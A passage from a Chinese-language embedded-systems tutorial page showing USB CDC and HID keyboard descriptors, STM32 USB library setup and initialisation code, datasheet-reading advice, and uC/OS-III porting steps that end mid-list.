Management Functional Descriptor*/</span></span><br><span class="line">    <span class="number">0x05</span>,   <span class="comment">/* bFunctionLength */</span></span><br><span class="line">    <span class="number">0x24</span>,   <span class="comment">/* bDescriptorType: CS_INTERFACE */</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">/* bDescriptorSubtype: Call Management Func Desc */</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">/* bmCapabilities: D0+D1 */</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">/* bDataInterface: 1 */</span></span><br><span class="line">    <span class="comment">/*ACM Functional Descriptor*/</span></span><br><span class="line">    <span class="number">0x04</span>,   <span class="comment">/* bFunctionLength */</span></span><br><span class="line">    <span class="number">0x24</span>,   <span class="comment">/* bDescriptorType: CS_INTERFACE */</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/* bDescriptorSubtype: Abstract Control Management desc */</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/* bmCapabilities */</span></span><br><span class="line">    <span class="comment">/*Union Functional Descriptor*/</span></span><br><span class="line">    <span class="number">0x05</span>,   <span class="comment">/* bFunctionLength */</span></span><br><span class="line">    <span class="number">0x24</span>,   <span class="comment">/* bDescriptorType: CS_INTERFACE */</span></span><br><span class="line">    <span class="number">0x06</span>,   <span class="comment">/* bDescriptorSubtype: Union func desc */</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">/* bMasterInterface: Communication class interface */</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">/* bSlaveInterface0: Data Class Interface */</span></span><br><span class="line">    <span class="comment">/*Endpoint 2 Descriptor端点描述符*/</span></span><br><span class="line">    <span class="number">0x07</span>,   <span class="comment">/* bLength: Endpoint Descriptor size */</span></span><br><span class="line">    USB_ENDPOINT_DESCRIPTOR_TYPE,   <span class="comment">/* bDescriptorType: Endpoint */</span></span><br><span class="line">    <span class="number">0x82</span>,   <span class="comment">/* bEndpointAddress: (IN2) */</span></span><br><span class="line">    <span class="number">0x03</span>,   <span class="comment">/* bmAttributes: Interrupt */</span></span><br><span class="line">    VIRTUAL_COM_PORT_INT_SIZE,      <span class="comment">/* wMaxPacketSize: */</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xFF</span>,   <span class="comment">/* bInterval: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*Data class interface descriptor类描述符*/</span></span><br><span class="line">    <span class="number">0x09</span>,   <span class="comment">/* bLength: Endpoint Descriptor size */</span></span><br><span class="line">    USB_INTERFACE_DESCRIPTOR_TYPE,  <span class="comment">/* bDescriptorType: */</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/* bInterfaceNumber: Number of Interface */</span><span class="comment">//&lt;接口 2&gt;</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">/* bAlternateSetting: Alternate setting */</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/* bNumEndpoints: Two endpoints used */</span></span><br><span class="line">    <span class="number">0x0A</span>,   <span class="comment">/* bInterfaceClass: CDC */</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">/* bInterfaceSubClass: */</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">/* bInterfaceProtocol: */</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">/* iInterface: */</span></span><br><span class="line">    <span class="comment">/*Endpoint 3 Descriptor端点描述符*/</span></span><br><span class="line">    <span class="number">0x07</span>,   <span class="comment">/* bLength: Endpoint Descriptor size */</span></span><br><span class="line">    USB_ENDPOINT_DESCRIPTOR_TYPE,   <span class="comment">/* bDescriptorType: Endpoint */</span></span><br><span class="line">    <span class="number">0x03</span>,   <span class="comment">/* bEndpointAddress: (OUT3) */</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/* bmAttributes: Bulk */</span></span><br><span class="line">    VIRTUAL_COM_PORT_DATA_SIZE,             <span class="comment">/* wMaxPacketSize: */</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">/* bInterval: ignore for Bulk transfer */</span></span><br><span class="line">    <span class="comment">/*Endpoint 1 Descriptor 端点描述符*/</span></span><br><span class="line">    <span class="number">0x07</span>,   <span class="comment">/* bLength: Endpoint Descriptor size */</span></span><br><span class="line">    USB_ENDPOINT_DESCRIPTOR_TYPE,   <span class="comment">/* bDescriptorType: Endpoint */</span></span><br><span class="line">    <span class="number">0x81</span>,   <span class="comment">/* bEndpointAddress: (IN1) */</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/* bmAttributes: Bulk */</span></span><br><span class="line">    VIRTUAL_COM_PORT_DATA_SIZE,             <span class="comment">/* wMaxPacketSize: */</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>    <span class="comment">/* bInterval */</span></span><br><span class="line">&#125;; <span class="comment">/* CustomHID_ConfigDescriptor */</span></span><br></pre></td></tr></table></figure>
<p>另外，对于HID设备还要有报告描述符。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> CustomHID_ReportDescriptor[CUSTOMHID_SIZ_REPORT_DESC] =</span><br><span class="line">  &#123;       </span><br><span class="line"><span class="comment">//0x05:0000 01 01 这是个全局条目，用途页选择为普通桌面页</span></span><br><span class="line">	<span class="number">0x05</span>, <span class="number">0x01</span>, <span class="comment">// USAGE_PAGE (Generic Desktop)</span></span><br><span class="line">	<span class="comment">//0x09:0000 10 01 这是个全局条目，用途选择为键盘</span></span><br><span class="line">	<span class="number">0x09</span>, <span class="number">0x06</span>, <span class="comment">// USAGE (Keyboard)</span></span><br><span class="line">	<span class="comment">//0xa1:1010 00 01 这是个主条目，选择为应用集合，</span></span><br><span class="line">	<span class="number">0xa1</span>, <span class="number">0x01</span>, <span class="comment">// COLLECTION (Application)</span></span><br><span class="line">	<span class="comment">//0x05:0000 01 11 这是个全局条目，用途页选择为键盘/按键</span></span><br><span class="line">	<span class="number">0x05</span>, <span class="number">0x07</span>, <span class="comment">// USAGE_PAGE (Keyboard/Keypad)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//0x19:0001 10 01 这是个局部条目，用途的最小值为0xe0，对应键盘上的左ctrl键</span></span><br><span class="line">	<span class="number">0x19</span>, <span class="number">0xe0</span>, <span class="comment">// USAGE_MINIMUM (Keyboard LeftControl)</span></span><br><span class="line">	<span class="comment">//0x29:0010 10 01 这是个局部条目，用途的最大值为0xe7，对应键盘上的有GUI(WIN)键</span></span><br><span class="line">	<span class="number">0x29</span>, <span class="number">0xe7</span>, <span class="comment">// USAGE_MAXIMUM (Keyboard Right GUI)</span></span><br><span class="line">	<span class="comment">//0x15:0001 01 01 这是个全局条目，说明数据的逻辑值最小值为0</span></span><br><span class="line">	<span class="number">0x15</span>, <span class="number">0x00</span>, <span class="comment">// LOGICAL_MINIMUM (0)</span></span><br><span class="line">	<span class="comment">//0x25:0010 01 01 这是个全局条目，说明数据的逻辑值最大值为1</span></span><br><span class="line">	<span class="number">0x25</span>, <span class="number">0x01</span>, <span class="comment">// LOGICAL_MAXIMUM (1)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//0x95:1001 01 01 这是个全局条目，数据域的数量为8个</span></span><br><span class="line">	<span class="number">0x95</span>, <span class="number">0x08</span>, <span class="comment">// REPORT_COUNT (8)</span></span><br><span class="line">	<span class="comment">//0x75:0111 01 01 这是个全局条目，每个数据域的长度为1位</span></span><br><span class="line">	<span class="number">0x75</span>, <span class="number">0x01</span>, <span class="comment">// REPORT_SIZE (1)	   </span></span><br><span class="line">	<span class="comment">//0x81:1000 00 01 这是个主条目，有8*1bit数据域作为输入，属性为:Data,Var,Abs</span></span><br><span class="line">	<span class="number">0x81</span>, <span class="number">0x02</span>, <span class="comment">// INPUT (Data,Var,Abs)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//0x95:1001 01 01 这是个全局条目,数据域的数量为1个</span></span><br><span class="line">	<span class="number">0x95</span>, <span class="number">0x01</span>, <span class="comment">// REPORT_COUNT (1)</span></span><br><span class="line">	<span class="comment">//0x75:0111 01 01 这是个全局条目，每个数据域的长度为8位</span></span><br><span class="line">	<span class="number">0x75</span>, <span class="number">0x08</span>, <span class="comment">// REPORT_SIZE (8)</span></span><br><span class="line">	<span class="comment">//0x81:1000 00 01 这是个主条目，有1*8bit数据域作为输入，属性为:Cnst,Var,Abs</span></span><br><span class="line">	<span class="number">0x81</span>, <span class="number">0x03</span>, <span class="comment">// INPUT (Cnst,Var,Abs)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//0x95:1001 01 01 这是个全局条目，数据域的数量为6个</span></span><br><span class="line">	<span class="number">0x95</span>, <span class="number">0x06</span>, <span class="comment">// REPORT_COUNT (6)</span></span><br><span class="line">	<span class="comment">//0x75:0111 01 01 这是个全局条目，每个数据域的长度为8位</span></span><br><span class="line">	<span class="number">0x75</span>, <span class="number">0x08</span>, <span class="comment">// REPORT_SIZE (8)</span></span><br><span class="line">	<span class="comment">//0x25:0010 01 01 这是个全局条目，逻辑最大值为255</span></span><br><span class="line">	<span class="number">0x25</span>, <span class="number">0xFF</span>, <span class="comment">// LOGICAL_MAXIMUM (255)</span></span><br><span class="line">	<span class="comment">//0x19:0001 10 01 这是个局部条目，用途的最小值为0</span></span><br><span class="line">	<span class="number">0x19</span>, <span class="number">0x00</span>, <span class="comment">// USAGE_MINIMUM (Reserved (no event indicated))</span></span><br><span class="line">	<span class="comment">//0x29:0010 10 01 这是个局部条目，用途的最大值为0x65</span></span><br><span class="line">	<span class="number">0x29</span>, <span class="number">0x65</span>, <span class="comment">// USAGE_MAXIMUM (Keyboard Application)</span></span><br><span class="line">	<span class="comment">//0x81:1000 00 01 这是个主条目，有6*8bit的数据域作为输入，属相为属性为:Data,Var,Abs</span></span><br><span class="line">	<span class="number">0x81</span>, <span class="number">0x00</span>, <span class="comment">// INPUT (Data,Ary,Abs)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//0x25:0010 01 01 这是个全局条目，逻辑的最大值为1</span></span><br><span class="line">	<span class="number">0x25</span>, <span class="number">0x01</span>, <span class="comment">// LOGICAL_MAXIMUM (1)</span></span><br><span class="line">	<span class="comment">//0x95:1001 01 01 这是个全局条目，数据域的数量为2</span></span><br><span class="line">	<span class="number">0x95</span>, <span class="number">0x02</span>, <span class="comment">// REPORT_COUNT (2)</span></span><br><span class="line">	<span class="comment">//0x75:0111 01 01 这是个全局条目，每个数据域的长度为1位</span></span><br><span class="line">	<span class="number">0x75</span>, <span class="number">0x01</span>, <span class="comment">// REPORT_SIZE (1)</span></span><br><span class="line">	<span class="comment">//0x05:0000 01 01 这是个全局条目，用途页选择为LED页</span></span><br><span class="line">	<span class="number">0x05</span>, <span class="number">0x08</span>, <span class="comment">// USAGE_PAGE (LEDs)</span></span><br><span class="line">	<span class="comment">//0x19:0001 10 01 这是个局部条目，用途的最小值为0x01,对应键盘上的Num Lock</span></span><br><span class="line">	<span class="number">0x19</span>, <span class="number">0x01</span>, <span class="comment">// USAGE_MINIMUM (Num Lock)</span></span><br><span class="line">	<span class="comment">//0x29:0010 10 01 这是个局部条目，用途的最大值为0x02,对应键盘上的Caps Lock</span></span><br><span class="line">	<span class="number">0x29</span>, <span class="number">0x02</span>, <span class="comment">// USAGE_MAXIMUM (Caps Lock)</span></span><br><span class="line">	<span class="comment">//0x91:1001 00 01 这是个主条目，有2*1bit的数据域作为输出，属性为:Data,Var,Abs</span></span><br><span class="line">	<span class="number">0x91</span>, <span class="number">0x02</span>, <span class="comment">// OUTPUT (Data,Var,Abs)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//0x95:1001 01 01 这是个全局条目，数据域的数量为1个</span></span><br><span class="line">	<span class="number">0x95</span>, <span class="number">0x01</span>, <span class="comment">// REPORT_COUNT (1)</span></span><br><span class="line">	<span class="comment">//0x75:0111 01 01 这是个全局条目，每个数据域的长度为6bit,正好与前面的2bit组成1字节</span></span><br><span class="line">	<span class="number">0x75</span>, <span class="number">0x06</span>, <span class="comment">// REPORT_SIZE (6)</span></span><br><span class="line">	<span class="comment">//0x91:1001 00 01 这是个主条目，有1*6bit数据域最为输出，属性为:Cnst,Var,Abs</span></span><br><span class="line">	<span class="number">0x91</span>, <span class="number">0x03</span>, <span class="comment">// OUTPUT (Cnst,Var,Abs)</span></span><br><span class="line"></span><br><span class="line">	<span class="number">0xc0</span>        <span class="comment">// END_COLLECTION</span></span><br><span class="line"></span><br><span class="line">&#125;; <span class="comment">/* CustomHID_ReportDescriptor */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="常见-USB-设备类"><a href="#常见-USB-设备类" class="headerlink" title="常见 USB 设备类"></a>常见 USB 设备类</h4><p>音频类（Audio）<br>通信设备类（CDC）<br>设备固件升级类（DFU）<br>人机接口类（HID）<br>大容量存储设备类（Mass Storage）</p>
<h3 id="USB-代码库结构"><a href="#USB-代码库结构" class="headerlink" title="USB 代码库结构"></a>USB 代码库结构</h3><p>usb_regs.c：操作USB控制寄存器。<br>usb_init.c：初始化USB控制器。<br>usb_int.c：处理中断。CTR_LP：负责USB低优先级中断的处理，CTR_HP：负责USB高优先级中断的处理。<br>usb_mem.c：处理PMA数据，是stm32内部用于USB&#x2F;CAN的专用数据缓冲区。PMAToUserBufferCopy：将USB数据传送到主机UserToPMABufferCopy：将主机数据传送到USB。<br>usb_core.c：处理USB2.0协议。<br>usb_sil.c：为USB端点提供简化的读写访问函数。</p>
<p>hw_config.c：配置硬件，比如初始化USB时钟、USB中断、低功耗模式处理等。<br>usb_desc.c：处理描述符。<br>usb_endp.c：处理正确传输中断回调函数，用于非控制传输<br>usb_istr.c：处理USB中断<br>usb_prop.c：处理所有设备相关事件<br>usb_pwr.c：管理USB控制器的电源</p>
<h3 id="STM32F103-中使用-USB"><a href="#STM32F103-中使用-USB" class="headerlink" title="STM32F103 中使用 USB"></a>STM32F103 中使用 USB</h3><p>导入代码。</p>
<p>加入头文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw_config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;usb_lib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;usb_init.h&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>初始化USB</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 重启 USB</span></span><br><span class="line"><span class="built_in">USB_Port_Set</span>(<span class="number">0</span>); </span><br><span class="line"><span class="built_in">delay_ms</span>(<span class="number">700</span>);</span><br><span class="line"><span class="built_in">USB_Port_Set</span>(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 初始化 USB</span></span><br><span class="line"><span class="built_in">Set_USBClock</span>(); </span><br><span class="line"><span class="built_in">USB_Interrupts_Config</span>();</span><br><span class="line"><span class="built_in">USB_Init</span>();</span><br></pre></td></tr></table></figure>

<h3 id="STM32F4-中导入USB-OTG开发包"><a href="#STM32F4-中导入USB-OTG开发包" class="headerlink" title="STM32F4 中导入USB-OTG开发包"></a>STM32F4 中导入USB-OTG开发包</h3><p>首先去官网下载最新的<a href="">USB开发包</a>，将Libraries下的STM32_USB_Device_Library，STM32_USB_HOST_Library，STM32_USB_OTG_Driver三个文件夹拷贝到项目目录下。其中OTG_Driver是另外两个的基础驱动。在项目中，分别添加这三个目录下的Core文件到项目中，并从中提取以下文件单独放置到Config项目目录下。</p>
<ul>
<li>Device_Library\Core\inc\usbd_conf_template.h</li>
<li>HOST_Library\Core\inc\usbh_conf_template.h</li>
<li>OTG_Driver\Core\src\usb_bsp_template.h</li>
<li>OTG_Driver\Core\inc\usb_bsp_template.h</li>
<li>Device_Library\Class\cdc\src\usbd_cdc_if_template.c</li>
<li>Device_Library\Class\cdc\inc\usbd_cdc_if_template.h</li>
</ul>
<p>另外，到Project\USB_Device_Examples下找到VCP目录，复制如下文件到Config下</p>
<ul>
<li>inc\usb_conf.h</li>
<li>inc\usbd_cdc_vcp.h</li>
<li>inc\usbd_conf.h</li>
<li>inc\usbd_desc.h</li>
<li>src\app.c</li>
<li>src\usb_bsp.c</li>
<li>src\usbd_desc.c</li>
<li>src\usbd_usr.c</li>
</ul>
<p>更改为合适的名字后，等待下一步修改。</p>
<h4 id="USB-CONF-H"><a href="#USB-CONF-H" class="headerlink" title="USB_CONF.H"></a>USB_CONF.H</h4><p>打开开关</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> USE_USB_OTG_FS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USE_HOST_MODE</span></span><br></pre></td></tr></table></figure>

<h4 id="USBD-CONF-H"><a href="#USBD-CONF-H" class="headerlink" title="USBD_CONF.H"></a>USBD_CONF.H</h4><p>定义</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> USBD_CFG_MAX_NUM           1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USBD_ITF_MAX_NUM           4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USB_MAX_STR_DESC_SIZ       64 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USBD_EP0_MAX_PACKET_SIZE   64</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USBD_SELF_POWERED</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//   VCP</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CDC_IN_EP                       0x81  <span class="comment">/* EP1 for data IN */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CDC_OUT_EP                      0x01  <span class="comment">/* EP1 for data OUT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CDC_CMD_EP                      0x82  <span class="comment">/* EP2 for CDC commands */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_USB_OTG_HS</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> CDC_DATA_MAX_PACKET_SIZE       64   <span class="comment">/* Endpoint IN &amp; OUT Packet size */</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> CDC_CMD_PACKET_SZE             8    <span class="comment">/* Control Endpoint Packet size */</span></span></span><br><span class="line"></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> CDC_IN_FRAME_INTERVAL          40   <span class="comment">/* Number of micro-frames between IN transfers */</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> APP_RX_DATA_SIZE               2048 <span class="comment">/* Total size of IN buffer: </span></span></span><br><span class="line"><span class="comment"><span class="meta">                                                APP_RX_DATA_SIZE*8/MAX_BAUDARATE*1000 should be &gt; CDC_IN_FRAME_INTERVAL*8 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> CDC_DATA_MAX_PACKET_SIZE       64   <span class="comment">/* Endpoint IN &amp; OUT Packet size */</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> CDC_CMD_PACKET_SZE             8    <span class="comment">/* Control Endpoint Packet size */</span></span></span><br><span class="line"></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> CDC_IN_FRAME_INTERVAL          5    <span class="comment">/* Number of frames between IN transfers */</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> APP_RX_DATA_SIZE               2048 <span class="comment">/* Total size of IN buffer: </span></span></span><br><span class="line"><span class="comment"><span class="meta">                                                APP_RX_DATA_SIZE*8/MAX_BAUDARATE*1000 should be &gt; CDC_IN_FRAME_INTERVAL */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* USE_USB_OTG_HS */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_FOPS                        VCP_fops</span></span><br></pre></td></tr></table></figure>

<h4 id="USB-DESC-C"><a href="#USB-DESC-C" class="headerlink" title="USB_DESC.C"></a>USB_DESC.C</h4><p>修改设备类型</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// USBD_DeviceDesc</span></span><br><span class="line"><span class="number">0x02</span>,                         <span class="comment">/* bDeviceClass */</span></span><br><span class="line"><span class="number">0x00</span>,                         <span class="comment">/* bDeviceSubClass */</span></span><br></pre></td></tr></table></figure>

<h4 id="USB-APP-C"><a href="#USB-APP-C" class="headerlink" title="USB_APP.C"></a>USB_APP.C</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">USBH_HOST  USB_Host;</span><br><span class="line">USB_OTG_CORE_HANDLE  USB_OTG_Core_dev; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OTG_FS_IRQHandler</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   		    </span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">USB_OTG_IsHostMode</span>(&amp;USB_OTG_Core_dev)) <span class="comment">//È·¶¨ÊÇ²»ÊÇUSBÖ÷»úÄ£Ê½?</span></span><br><span class="line">	&#123;  </span><br><span class="line">		<span class="built_in">USBH_OTG_ISR_Handler</span>(&amp;USB_OTG_Core_dev);<span class="comment">//USBÖ÷»úÖÐ¶Ï</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">USBD_OTG_ISR_Handler</span>(&amp;USB_OTG_Core_dev);<span class="comment">//USB´Ô»úÖÐ¶Ï</span></span><br><span class="line">	&#125;											 </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">USBD_Configuration</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">USBD_Init</span>(&amp;USB_OTG_Core_dev, USB_OTG_FS_CORE_ID, &amp;USR_desc, &amp;USBD_CDC_cb, &amp;USBD_USR_cb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="分析-Datasheet"><a href="#分析-Datasheet" class="headerlink" title="分析 Datasheet"></a>分析 Datasheet</h2><p>一般在Datasheet里有如下几个部分：</p>
<ul>
<li>芯片基本信息</li>
<li>电器特性</li>
<li>引脚特性</li>
<li>封装尺寸</li>
<li>参考电路</li>
<li>寄存器和软件</li>
<li>其他</li>
</ul>
<p>阅读Datasheet的步骤：</p>
<ul>
<li>快速阅读</li>
<li>应用场景和参考电路</li>
<li>关键参数与指标</li>
<li>涉及到的相关算法，协议，配合器件做延伸阅读</li>
<li>读剩下的部分</li>
<li>对比芯片家族</li>
<li>对比类似产品</li>
</ul>
<p>一般文档的首页是该芯片的重要信息，有些参数如电源、封装、通道数是属于功能应用信息，而如精度、分辨率等属于性能应用信息。比较而言，功能应用信息首先要关注。</p>
<p>参数：</p>
<ul>
<li>电器参数，这里只关注重要参数，且要做标记；</li>
<li>极限参数，对于部分需要的极限参数也要看；</li>
<li>管脚参数，防止使用不当。</li>
</ul>
<p>性能测试图：大概浏览即可。</p>
<p>芯片应用：这部分需要仔细看，搞定时序，逻辑等。</p>
<p>封装信息：在绘制封装时需要看。</p>
<p>最后注意：不要尽信Datasheet，因为可能会有错误。</p>
<h2 id="芯片目录"><a href="#芯片目录" class="headerlink" title="芯片目录"></a>芯片目录</h2><h3 id="模拟芯片"><a href="#模拟芯片" class="headerlink" title="模拟芯片"></a>模拟芯片</h3><h3 id="数字芯片"><a href="#数字芯片" class="headerlink" title="数字芯片"></a>数字芯片</h3><h3 id="主控"><a href="#主控" class="headerlink" title="主控"></a>主控</h3><h3 id="电压芯片"><a href="#电压芯片" class="headerlink" title="电压芯片"></a>电压芯片</h3><p>AMS-1117：线性降压<br>SX1308：升压芯片</p>
<h2 id="uC-OS-III-参考"><a href="#uC-OS-III-参考" class="headerlink" title="uC&#x2F;OS-III 参考"></a>uC&#x2F;OS-III 参考</h2><h3 id="uC-OS-III-代码架构"><a href="#uC-OS-III-代码架构" class="headerlink" title="uC&#x2F;OS-III 代码架构"></a>uC&#x2F;OS-III 代码架构</h3><p>主要有：配置文件，应用程序，系统代码，库文件，CPU相关代码，BSP板级支持包等。</p>
<p>配置文件：cpu_cfg.h，lib_cfg.h，os_cfg.h，os_cfg_app.h</p>
<p>应用程序：app.c，app.h</p>
<p>库文件：lib_*</p>
<p>系统代码：os_cfg_app.c，os_type.h，os_core.c，os_dgb.c，os_flag.c，os_int.c，os_mem.c，os_msg.c，os_mutex.c，os_pend_multi.c，os_g.c，os_sem.c，os_stat.c，os_tick.c，os_time.c，os_tmr.c，os_var.c，os.h</p>
<p>CPU相关代码：os_cpu.h，os_cpu_a.asm，os_cpu_c.c，cpu_def.h，cpu_c.c，cpu_a.asm，cpu_core.c，cpu_core.h</p>
<p>BSP板级支持包：bsp.h，bsp.c</p>
<h3 id="uC-OS-III-代码移植"><a href="#uC-OS-III-代码移植" class="headerlink" title="uC&#x2F;OS III 代码移植"></a>uC&#x2F;OS III 代码移植</h3><p>首先去<a href="https://www.micrium.com/">官方代码下载</a>，下载uC&#x2F;OS III 代码，对于F103可以下载STM32F107的代码，选择Keil版，uC&#x2F;OS III。</p>
<p>下载完成后，代码目录如下：</p>
<ul>
<li>Software<ul>
<li>EvalBoards<ul>
<li>Micrium<ul>
<li>uC-Eval-STM32F107<ul>
<li>BSP</li>
<li>uCOS-III</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>uC-CPU<ul>
<li>ARM-Cortex-M3<ul>
<li>GNU</li>
<li>IAR</li>
<li>RealView</li>
</ul>
</li>
</ul>
</li>
<li>uC-LIB<ul>
<li>Port<ul>
<li>ARM-Cortex-M3<ul>
<li>GNU</li>
<li>IAR</li>
<li>RealView</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>uCOS-III<ul>
<li>Source</li>
<li>Ports<ul>
<li>ARM-Cortex-M3 <ul>
<li>GNU</li>
<li>IAR</li>
<li>RealView</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>首先在我们的项目文件夹下建立目录：</p>
<ul>
<li>STM32F103RBT<ul>
<li>Project</li>
<li>User</li>
<li>Device</li>
<li>Driver</li>
<li>Ucos<ul>
<li>lib</li>
<li>core</li>
<li>cpu</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>之后：</p>
<ul>
<li>将代码目录<code>\uC-CPU</code>以及<code>\uC-CPU\ARM-Cortex-M3\RealView</code>下的文件（不包括文件夹）全部拷贝到我们的项目目录<code>\STM32F103RBT\Ucos\cpu</code>下；</li>
<li>将代码目录<code>\uC-LIB</code>以及<code>\uC-LIB\Ports\ARM-Cortex-M3\RealView</code>下的文件（不包括文件夹）全部拷贝到我们的项目目录<code>\STM32F103RBT\Ucos\lib</code>下；</li>
<li>将代码目录<code>\uCOS-III\Source</code>以及<code>\uCOS-III\Ports\ARM-Cortex-M3\Generic\RealView</code>下的文件（不包括文件夹）全部拷贝到我们的项目目录<code>\STM32F103RBT\Ucos\core</code>下；</li>
<li>将代码目录<code>\EvalBoards\Micrium\uC-Eval-STM32F107\uCOS-III</code>下的文件（不包括文件夹与<code>stm32f10x_conf.h</code>）全部拷贝到我们的项目目录<code>\STM32F103RBT\User</code>下。</li>
<li>将代码目录<code>\EvalBoards\Micrium\uC-Eval-STM32F107\BSP</code>下的<code>bsp.c</code>与<code>bsp.h</code>拷贝到我们的项目目录<code>\STM32F103RBT\User</code>下。</li>
</ul>
<p>打开<code>Manage Project Items</code>按钮，编辑项目目录。这可以按照项目目录创建<code>Groups</code>，并在对应的<code>Files</code>中添加相应<code>.c</code>文件和汇编（<code>.asm</code>，<code>.a</code>，<code>.s</code>）文件。</p>
<p>修改<code>startup_stm32f10x_md.s</code>：</p>
<ul>
<li><code>PendSV_Handler</code>改为<code>OS_CPU_PendSVHandler</code>，共3处；</li>
<li><code>SysTick_Handler</code>改为<code>OS_CPU_SysTickHandler</code>，共3处；</li>
</ul>
<p>修改<code>includes.h</code>：</p>
<ul>
<li><code>#include &lt;stm32f10x_lib.h&gt;</code>改为<code>#include &quot;stm32f10x.h&quot;</code>；</li>
</ul>
<p>修改<code>cpu_cfg.h</code>：</p>
<ul>
<li><code>CPU_CFG_TS_32_EN</code>后面的选项为<code>DEF_ENABLED</code>；</li>
<li><code>CPU_CFG_INT_DIS_MEAS_EN</code>上面的<code>#if 0</code>为<code>#if 1</code>；</li>
</ul>
<p>修改<code>app_cfg.h</code>：</p>
<ul>
<li><code>APP_CFG_SERIAL_EN</code>后面的选项为<code>DEF_DISABLED</code>；</li>
</ul>
<p>修改<code>lib_cfg.h</code>:</p>
<ul>
<li><code>LIB_MEM_CFG_HEAP_SIZE</code>后面的大小改为<code>2u * 1024u</code></li>
</ul>
<p>修改<code>app.c</code>：</p>
<ul>
<li><code>BSP_IntDisAll();</code>去掉；</li>
<li>修改<code>AppTaskStart</code>函数的内容；</li>
</ul>
<p>删除下面的部分；</p>
